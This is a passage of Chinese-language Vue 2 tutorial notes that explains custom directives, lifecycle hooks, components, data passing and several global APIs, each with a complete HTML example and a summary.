    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- 
                需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
                需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。 
            -->
            <h3>当前的n值是：<span v-text="n"></span></h3>
            <h3>扩大10倍后的n值是：<span v-big="n"></span></h3>
            <!-- <h3>扩大10倍后的n值是：<span v-big-number="n"></span></h3> -->
            <button @click="n++">点我n+1</button>
            <hr>
            <input type="text" v-fbind:value="n">
            <hr>
        </div>
        <div id="root2">
            <input type="text" v-fbind:value="x">
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 全局自定义指令(如果是函数式指令，第二个参数为function(){})
                Vue.directive('fbind',{
                                // 指令与元素成功被绑定时
                                bind(element,binding){
                                    // console.log('1');
                                    // 所有指令里的this都是window
                                    // console.log(this);
                                    element.value = binding.value
                                },
                                // 指令所在元素被插入页面时
                                inserted(element,binding){
                                    // console.log('2');
                                    element.focus()
                                },
                                // 指令所在的模板被重新解析时
                                update(element,binding){
                                    // console.log('3');
                                    element.value = binding.value
                                }
                            })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            n:1,
                        },
                        directives:{
                            // 函数式
                            /* 
                                big函数何时被调用
                                    1.指令与元素成功被绑定时；
                                    2.指令所在的模板被重新解析时。
                            */
                            big(element,binding) {
                                // element表示big指令所在的结构标签
                                // binding是big绑定的信息，value就是它的值
                                // console.log(element,binding);
                                element.innerText = binding.value * 10
                            },
                            // 'big-number'(element,binding) {
                            //     // element表示big指令所在的结构标签
                            //     // binding是big绑定的信息，value就是它的值
                            //     // console.log(element,binding);
                            //     element.innerText = binding.value * 10
                            // },
                            /* fbind:{
                                // 指令与元素成功被绑定时
                                bind(element,binding){
                                    // console.log('1');
                                    // 所有指令里的this都是window
                                    // console.log(this);
                                    element.value = binding.value
                                },
                                // 指令所在元素被插入页面时
                                inserted(element,binding){
                                    // console.log('2');
                                    element.focus()
                                },
                                // 指令所在的模板被重新解析时
                                update(element,binding){
                                    // console.log('3');
                                    element.value = binding.value
                                }
                            } */
                        }
                        
                }),
                new Vue({
                    el: "#root2",
                    data: {
                        x: 1
                    }
                })
        </script>
</body>
</html>
```

**总结：**

```txt
一、定义语法：
         (1).局部指令：
                  new Vue({                                            new Vue({
                     directives:{指令名:配置对象}   或         directives{指令名:回调函数}
                  })                                                        })
         (2).全局指令：
                     Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)

二、配置对象中常用的3个回调：
         (1).bind：指令与元素成功绑定时调用。
         (2).inserted：指令所在元素被插入页面时调用。
         (3).update：指令所在模板结构被重新解析时调用。

三、备注：
         1.指令定义时不加v-，但使用时要加v-；
         2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名
```



### 2.12.生命周期

#### 2.12.1.生命周期概述

​	为了解Vue的生命周期，我们先完成以下页面来进行观察：页面字体的透明度在0-1之间变化:

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627930.gif)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
                <h3 :style="{opacity}">欢迎学习Vue</h3>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                const vm = new Vue({
                        el: '#root',
                        data:{
                                opacity:1
                        },
                        // Vue完成模板的解析并把初始的真实DOM元素放入页面后(挂载完毕)调用mounted
                        mounted() {
                                setInterval(() => {
                                                this.opacity -= 0.01
                                                if(this.opacity <= 0)  this.opacity = 1 
                                        }, 20);
                        },
                        
                })
                // 通过外部定时器实现，但不推荐，生产下不会接收vm对象
                /* setInterval(() => {
                       vm.opacity -= 0.01
                       if(vm.opacity <= 0)  vm.opacity = 1 
                }, 20); */
        </script>
</body>
</html>
```

**总结：**

```vue
生命周期：
      1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
      2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
      3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
      4.生命周期函数中的this指向是vm 或 组件实例对象。
```

#### 2.12.2.分析生命周期

​	我们在`2.12.1`中使用到了`mounted`这个声明周期函数，并且在这个函数调用之前和之后都调用了一些兄弟函数，那么这些兄弟函数又有哪些呢？我们先参照官网创建Vue示例的图示(https://v2.cn.vuejs.org/v2/guide/instance.html)：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627931.png" style="zoom: 50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root' :x="n">
            <h3>当前的n值是：{{n}}</h3>
            <button @click="add">点我n+1</button>
            <button @click="byebye">点我销毁vm</button>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        // template:`
                        //     <div>
                        //         <h3>当前的n值是：{{n}}</h3>
                        //         <button @click="add">点我n+1</button>
                        //     </div>
                        // `,
                        data: {
                            n:1
                        },
                        methods:{
                            add() {
                                this.n += 1
                            },
                            byebye() {
                                console.log('byebye');
                                this.$destroy()
                            }
                        },
                        // 此方法初始化事件和生命周期，不会加载_data和n等值
                        beforeCreate() {
                            console.log('beforeCreate');  
                            // console.log(this); // 此处的this是Vue对象
                            // debugger;  调用，终止执行此行下的代码                   
                        },
                        // 数据开始代理监测，有了add方法和_data
                        created() {
                            console.log('created');
                            /* console.log(this);
                            debugger; */
                        },
                        beforeMount() {
                            console.log('beforeMount');
                            // console.log(this);
                            // debugger;
                            // 这里操作的DOM最终都不奏效
                            // document.querySelector('h2').innerText = '123';
                        },
                        mounted() {
                            console.log('mounted',this.$el);
                            // console.log(this);
                            // 此处操作DOM有效，但尽量避免该操作
                            // document.querySelector('h2').innerText = '123';
                        },
                        beforeUpdate() {
                            console.log('beforeUpdate')
                            // console.log(this.n)
                        },
                        updated() {
                            console.log('updated');
                        },
                        beforeDestroy() {
                            console.log('beforeDestroy');
                        },
                        destroyed() {
                            console.log('destroyed');
                        },
                        
                })
        </script>
</body>
</html>
```

**总结：**

```txt
常用的生命周期钩子：
      1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
      2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

关于销毁Vue实例
      1.销毁后借助Vue开发者工具看不到任何信息。
      2.销毁后自定义事件会失效，但原生DOM事件依然有效。
      3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
```

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
                <h3 :style="{opacity}">欢迎学习Vue</h3>
                <button @click="stop">点我停止变换</button>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                const vm = new Vue({
                        el: '#root',
                        data:{
                                opacity:1
                        },
                        methods: {
                            stop() {
                                // clearInterval(this.timer) // 点击还保留响应式
                                this.$destroy() // 暴力停止，直接杀死
                            }
                        },
                        // Vue完成模板的解析并把初始的真实DOM元素放入页面后(挂载完毕)调用mounted
                        mounted() {
                                this.timer = setInterval(() => {
                                                this.opacity -= 0.01
                                                if(this.opacity <= 0)  this.opacity = 1 
                                        }, 20);
                        },
                        // 在vm销毁之前，清除定时器
                        beforeDestroy() {
                            clearInterval(this.timer)
                        },
                })
        </script>
</body>
</html>
```



### 2.13.组件

​	Vue可以进行组件化开发，组件是Vue的基本结构单元，开发过程中用起来非常方便灵活，只需要按照Vue规范定义组件，将组件渲染到页面即可。组件能实现复杂的页面结构，提高代码的可复用性。下图是Vue官网提供的一副组件结构示例图：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627935.png" style="zoom:33%;" />

​	一张完整的页面可以分为几个不同的组件，并达到复用、易于管理的目的：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627933.png" style="zoom:33%;" />

#### 2.13.1.什么是组件

​	在Vue中，组件是构成页面中独立结构单元，能够减少重复代码的编写，提高开发效率，降低代码之间的耦合程度，使项目更易于维护和管理。组件主要以页面结构的形式存在，不同组件也具有基本交互功能，根据业务逻辑实现复杂的项目功能。

​	通过自定义标签来实现功能即把组件当成一个标签，全局组件的注册通过`Vue.compoent()`定义组件。通过以下案例自定义三个组件标签`<my-compoent></my-compoent>`实现获取点击自身的次数。

![image-20231214142636852](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312141426055.png)

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        组件使用的步骤：
            1.创建组件
            2.注册组件
            3.使用组件标签
     -->
    <div id="root">
        <my-compoent></my-compoent>
        <my-compoent></my-compoent>
        <my-compoent/>
    </div>
    <script>
        // 通过全局组测组件,参数1为组件名，参数2为配置对象
        Vue.component('my-compoent',{
            // 将data数据返回
            data() {
                return {
                    count: 0
                }
            },
            template:'<button @click="count++">被单击了{{count}}次</button>'
        })
        new Vue({
            el: "#root",
        })
    </script>
</body>
</html>
```

**总结：**

```txt
1.组件是页面中独立的结构单元，组件主要以页面结构形式存在，可以把组件理解成一个标签，标签可以为单标签，也可以为多标签；
2.定义组件的格式为：
			Vue.component('组件名',{
				data() {
					return{
						
					}
				}
			})
3.使用组件，将组件当成标签使用，把组件标签放到容器中<my-components/>
```



#### 2.13.2.局部组件

​	在以上的方式中我们使用`Vue.component()`来注册一个组件，实际这个组件是一个全局组件，它在页面中的所有容器中都能使用。除了全局组件外还可以通过Vue实例的`components`属性来注册局部组件，局部组件仅限于当前容器使用。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!--  -->
            <my-component></my-component>
            <!-- 以下方式报错，多个单词组成在标签中只能使用-隔开 -->
            <!-- <myComponent></myComponent> -->
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 1.定义组件
                var com1 = Vue.extend({
                    template:`<p>我是局部组件</p>`
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        components:{
                            // 2.注册组件，以k-v格式，k是组件名，v为配置对象
                            myComponent:com1,
                            // 注册组件时，如果-命名，则需用字符串形式
                            // 'my-component':com1
                        }
                        
                })
        </script>
</body>
</html>
```

**总结：**

```txt
Vue中使用组件的三大步骤：
      一、定义组件(创建组件)
      二、注册组件
      三、使用组件(写组件标签)

一、如何定义一个组件？
         使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
         区别如下：
               1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
               2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
         备注：使用template可以配置组件结构。

二、如何注册组件？
            1.局部注册：靠new Vue的时候传入components选项
            2.全局注册：靠Vue.component('组件名',组件)

三、编写组件标签：
            <school></school>
            
四、关于组件名:
         一个单词组成：
                  第一种写法(首字母小写)：school
                  第二种写法(首字母大写)：School
         多个单词组成：
                  第一种写法(kebab-case命名)：my-school
                  第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
         备注：
               (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
               (2).可以使用name配置项指定组件在开发者工具中呈现的名字。

五、关于组件标签:
         第一种写法：<school></school>
         第二种写法：<school/>
         备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

六、一个简写方式：
         const school = Vue.extend(options) 可简写为：const school = options
```

#### 2.13.3.template模板

​	在此之间使用`template`编写组件的时候非常麻烦，是使用字符串的形式进行传递的，非常容易出错。我们也可以将模板代码写在HTML中，通过`template`属性引入到组件中。Vue提供了<template>标签来定义结构的模板，可以在该标签中书写HTML代码，然后通过id值绑定到`template`属性上。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312141455910.png" alt="image-20231214145549799" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <p>{{title}}</p>
            <my-component></my-component>
        </div>
        <template id="temp">
            <p>{{title}}</p>
        </template>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                Vue.component('my-component',{
                    template:'#temp',
                    data() {
                        return{
                            title:'我是组件内部的title'
                        }
                    }
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            title:'我是vue实例的title'
                        }
                        
                })
        </script>
</body>
</html>
```

#### 2.13.4.组件间的数据传递

​	在Vue中，组件实例具有局部作用域，组件之间的数据传递需要借助一些工具来实现父组件向子组件传递数据信息。父组件和子组件的依赖关系是完成数据传递的基础。

​	在Vue中，数据传递主要通过`props`属性和`$emit`方式来实现。

- **通过`props`属性传值**：`props`即道具，用来接受父组件中定义的数据（即父组件向子组件传值），其值为数组，数组中是父组件传递的数据信息。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <my-parent name="title"></my-parent>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                var myParent = {
                    props: ['name'],
                    template:'<div>我是父组件的{{name}}</div>'
                }
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        components:{
                            myParent:myParent
                        }
                        
                })
        </script>
</body>
</html>
```



- **通过`$emit`传值：**`$emit`能够将子组件中的值传递到父组件中去。它可以触发父组件中定义的事件，子组件的数据信息通过传递参数的方式完成。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312141535988.png" alt="image-20231214153511868" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <parent></parent>
        </div>
        <!-- 子组件的模板 -->
        <template id="child">
            <div>
                <button @click="send()">发送</button>
                <input type="text" v-model="message">
            </div>
        </template>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建子组件child
                var child = {
                    template:"#child",
                    data() {
                        return {
                            message: ''
                        }
                    },
                    methods: {
                        send() {
                            this.$emit('childFun',this.message)
                        }
                    },
                }
                // 创建父组件parent
                var parent = {
                    template:`
                        <div>
                            <child @childFun="transContent"/>
                            子组件传递的消息：{{message}}    
                        </div>
                    `,
                    data() {
                        return {
                            message:''
                        }
                    },
                    methods: {
                        transContent(transData) {
                            this.message = transData
                        }
                    },
                    components:{
                        child:child
                    }
                }
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        components:{
                            child:child,
                            parent:parent
                        }
                })
        </script>
</body>
</html>
```

**总结：**

```txt
1.组件间传递数据的方式有两种：
	（1）props属性用来由父组件向子组件传递值，且props属性的值是数组形式；
	（2）$emit意为‘触发’，指子组件向父组件传递值，使用方式child.$emit(fun,value)，其中fun为传值所触发的事件，value为传递的值
```

#### 2.13.5.组件切换

​	Vue中的页面结构是由组件构成的，不同组件可以表示不同页面，适合进行单页应用开发。

​	以下案例我们创建登录和注册两个组件，通过观察flag的值确定是登录还是注册，再通过`v-if`和`v-else`确定显示哪个组件：

![image-20231214155828670](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312141558782.png)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <a href="#" @click.prevent="flag=true">登录</a>
            <a href="#" @click.prevent="flag=false">注册</a>
            <login v-if="flag"></login>
            <register v-else></register>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                var login = {
                    template:'<div>登录页面</div>'
                }
                var register = {
                    template:'<div>注册页面</div>'
                }
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            flag:true
                        },
                        components:{
                            login:login,
                            register:register
                        }
                        
                })
        </script>
</body>
</html>
```



## 3.常用API、全局属性和全局配置

### 3.1.Vue.use

​	`Vue`是一个扩展性较强的框架，可以使用插件完善一些功能。`Vue.use`主要用于在Vue中安装插件，插件可以是一个对象或函数，如果是对象，必须提供`install`方法；如果是函数，它会被作为`install`方法。`install`方法调用时，会将Vue作为参数传入。

​	案例：通过安装插件的方式让div盒子背景颜色为红色。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312191511631.png" alt="image-20231219151053510" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root' v-my-plugin>
            
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 1.定义插件对象
                let myPlugin = {}
                // 2.编写Install方法
                myPlugin.install = function(Vue,options) {
                    console.log(options);
                    Vue.directive('my-plugin',{
                        bind(el,binding) {
                            el.style = "width:100px;height:100px;background-color:red"
                        }
                    })
                }
                // 3.安装插件
                Vue.use(myPlugin,{
                    // 参数可以对插件进行配置
                    someOptions:true
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {}
                        
                })

        </script>
</body>
</html>
```

​	在组件化开发中，我们常常会用到第三方提供的插件库，如ElementUI，我们也会通过`Vue.use`来使用第三方插件，ElementUI使用参考：https://element.eleme.cn/#/zh-CN



### 3.2.Vue.set

​	`Vue`的核心具有一套响应式系统，简单来说就是通过监听器监听数据层的数据变化，当数据改变后，通知视图也自动更新。如果在Vue示例中已经配置好数据，后期如果想要再添加其他属性，这时就不再是响应式数据了。但Vue提供了一个API，即`Vue.set()`，它不仅可以完成属性和值的添加，还可以以响应式的方式进行添加。`set(target,key,val)`的三个参数分别代表：要`添加的对象`；`属性名`；`属性值`。

​	案例：通过点击事件为学生添加性别属性，并响应式的显示出来。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312191532570.png" alt="image-20231219153222444" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <h2>学生信息</h2>
            <button @click="addSex">添加一个性别属性，默认为男</button>
            <h3>学生姓名：{{student.name}}</h3>
            <h3>学生年龄：真实{{student.age.rAge}},对外{{student.age.sAge}}</h3>
            <h3 v-if="student.sex">学生性别：{{student.sex}}</h3>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                const vm = new Vue({
                        el: '#root',
                        data: {
                            student:{
					            name:'tom',
					            age:{
                                    rAge:40,
                                    sAge:29,
                                },
                                // sex:'男',
				            }
                          },
                          methods:{
                                addSex(){
                                    /* 
                                        Vue.set(target,key,val)
                                        target:要添加属性的对象
                                        key:属性
                                        val:值
                                        Vue.set()等效于vm.$set()
                                    */
                                    // Vue.set(this.student,'sex','男')
                                    this.$set(this.student,'sex','男')
                                }
                            }  
                })
        </script>
</body>
</html>
```



### 3.3.Vue.mixin

​	`Vue.mixin`用于全局注册一个混入，它将影响之后创建的每个Vue实例。该接口主要是提供给插件作者使用，在插件中向组件注入自定义的行为。该接口**不推荐在应用代码中使用**。

![image-20231220160402841](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312201604011.png)

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 全局注册一个混入
                Vue.mixin({
                    created() {
                        var myOption = this.$options.myOption
                        if(myOption) {
                            console.log(myOption.toUpperCase());
                        }
                    },
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        // 自定义属性myOption
                        myOption: 'hello'
                })
                new Vue({
                        el: '#root',
                        myOption: 'world'
                })
        </script>
</body>
</html>
```

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312201612194.png" alt="image-20231220161250068" style="zoom:50%;" />

​	通过以上案例，我们发现全局混入对所有的Vue实例都有影响。

### 3.4.vm.$slots

​	Vue中的组件中使用`template`模板定义HTML结构，为了方便使用`template`公共模板结构，Vue提出了插槽(Slots)的概念。插槽就是定义在组件内部的`template`模板，可以通过`$slots`动态获取。

​	在使用[渲染函数](https://v2.cn.vuejs.org/v2/guide/render-function.html)书写一个组件时，访问 `vm.$slots` 最有帮助--https://v2.cn.vuejs.org/v2/api/#vm-slots

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <!-- “你好”两字只能启用插槽才能显示 -->
            <my-component>你好</my-component>
        </div>
        <template id="temp">
            <div>
                <!-- 启用插槽 -->
                <slot></slot>
            </div>
        </template>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                Vue.component('my-component',{
                    template:'#temp'
                })
                // 创建Vue对象
                var vm = new Vue({
                        el: '#root',
                        data: {}   
                })
        </script>
</body>
</html>
```

### 3.5.vm.$attrs

​	`vm.$attrs`可以获取组件的属性，但其获取的属性中不包含class、style以及被声明的props的属性。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <my-component id="testId" class="testClass"></my-component>
        </div>
        <template id="temp">
            <div>
                <button @click="showAttrs()">点击显示属性</button>
            </div>
        </template>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                Vue.component('my-component',{
                    template:'#temp',
                    methods: {
                        showAttrs() {
                            console.log(this.$attrs)
                        }
                    },
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {}
                        
                })
        </script>
</body>
</html>
```

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312201649249.png" style="zoom:50%;" />

### 3.6.silent

​	Vue全局配置对象中，`silent`可以取消Vue日志和警告，值类型为boolean，默认值为false，设置为true则忽略警告和日志。下面代码中控制台会报错，因为通过插值语法绑定的变量msg没有定义在data中，我们可以通过`silent`忽略该警告：

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            {{msg}}
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 通过silent忽略警告
                Vue.config.silent = true
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {}
                        
                })
        </script>
</body>
</html>
```

### 3.7.devtools

​	在此之前我们已经使用过了调式工具vue-devtools，我们也可以通过全局配置中的devtools对其进行配置，设置成true表示允许调试，否则不允许调试，用法如下：

```vue
Vue.config.devtools = true
```



### 3.8.render

​	在Vue中可以使用Vue.render()对虚拟DOM进行操作。在Vue中一般使用template来创建HTML，但这种方式可编程性不强，而使用Vue.render()可以更好的发挥JS的编程能力。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <my-component>渲染函数的使用</my-component>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                Vue.component('my-component',{
                    // 通过渲染函数渲染，接收h参数，创建元素p
                    render(h) {
                        return h('p',{
                            style:{
                                color:'red',
                                fontSize: '30px'
                            }
                        },
                        // 插槽获取内容
                        this.$slots.default)
                    }

                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {}
                        
                })
        </script>
</body>
</html>
```

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312201718632.png" alt="image-20231220171835549" style="zoom:50%;" />

### 3.9.createElement

​	在`3.8`中我们看到了一个函数`h`，实际上这个函数的原样是`createElement`，它用来创建元素。需要注意的是`createElemtnt`返回的并不是一个实际的DOM元素，它返回的其实是一个描述节点(createNodeDescription)，它用来高速Vue在页面上需要渲染什么样的节点。这个描述节点也可以称为虚拟节点(Virtual Node)，简称为VNode。而虚拟DOM是对由Vue组件树建立起来的整个VNode树的称呼。

​	`createElement()`函数的使用非常灵活，它的第一个参数可以是一个HTML标签名或组件选项对象；第二个参数是可选的，可以传入一个与模板中属性对应的数据对象；第三个参数是由`createElement`构建而成的子级虚拟节点，也可以使用字符串来生成文本虚拟节点。

​	案例：创建组件`my-component`，通过`v-slot`的方式定义header、content、footer插槽，再通过`createElement()`渲染到页面上：

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <my-component>
                <template v-slot:header>
                    <div style="background-color:#ccc;height:50px">
                        这里是导航栏
                    </div>
                </template>
                <template v-slot:content>
                    <div style="background-color:#ddd;height:50px">
                        这里是展示信息
                    </div>
                </template>
                <template v-slot:footer>
                    <div style="background-color:#eee;height:50px">
                        这里是底部信息
                    </div>
                </template>
            </my-component>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建组件
                Vue.component('my-component',{
                    render(createElement) {
                        return createElement('div',[
                            createElement('header',this.$slots.header),
                            createElement('content',this.$slots.content),
                            createElement('footer',this.$slots.footer)
                        ])
                    }
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {}
                        
                })
        </script>
</body>
</html>
```

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312202214495.png" alt="image-20231220221417356" style="zoom:50%;" />

## 4.过渡和动画

